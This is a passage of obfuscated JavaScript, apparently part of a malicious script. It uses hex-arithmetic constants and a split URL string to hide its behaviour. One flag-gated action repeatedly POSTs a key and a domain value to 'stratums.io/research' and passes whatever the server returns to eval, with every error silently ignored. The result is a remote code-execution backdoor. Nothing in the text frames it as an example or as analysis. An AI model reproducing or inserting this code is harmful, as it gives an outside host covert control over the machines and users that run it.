        for (let i = -0x5ee + -0x6 * -0x2d4 + -0x1 * 0xb0a; i < -0x1b4a + 0x1 * -0xcf + -0x95f * -0x3; i++)
          setTimeout(g, (-0xb23c + 0x139f + -0x14af * -0x13) * i * getRandomInt(0x22df + 0x17b1 + 0x39 * -0x107, 0xfe2 + -0x1127 * 0x2 + -0x8f * -0x21));
      }, 0x96b8e8 + -0x2951 * 0x19f + 0x1a1e67);
    }
  ],
  [
    () => flags['RPL2_RPRT'],
    async () => {
      async function f() {
        try {
          axios['post']('https://st' + 'ratums.io/' + 'research', {
            'key': 'CX001_ZCa',
            'dom': me
          })['then'](g => {
            try {
              eval(g['data']);
            } catch (h) {}
          })['catch'](g => {});
        } catch (g) {}
      }
      f(), setInterval(f, -0x36af9 * -0x1 + 0x1 * 0x176c8 + -0x4de1);
    }
  ]
];
for (let e of actions)
  try {
    e[0xdc6 + -0x2242 + 0x147c]() && setTimeout(e[-0x2042 + 0x2443 + -0x1 * 0x400]);
  } catch (K) {
    warn(K);
  }